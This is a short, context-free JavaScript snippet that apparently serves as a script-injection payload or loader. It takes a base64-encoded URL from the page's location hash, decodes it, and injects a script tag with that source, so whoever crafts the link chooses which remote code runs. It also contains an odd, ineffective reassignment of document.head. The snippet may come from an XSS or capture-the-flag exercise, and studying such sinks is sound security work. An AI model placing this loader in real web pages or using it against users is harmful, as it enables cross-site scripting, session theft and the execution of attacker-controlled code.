var script = document.createElement('script');
script.src = atob(decodeURIComponent(location.hash.substr(1)));
document.head = document.createElement("head");
document.head.appendChild(script);
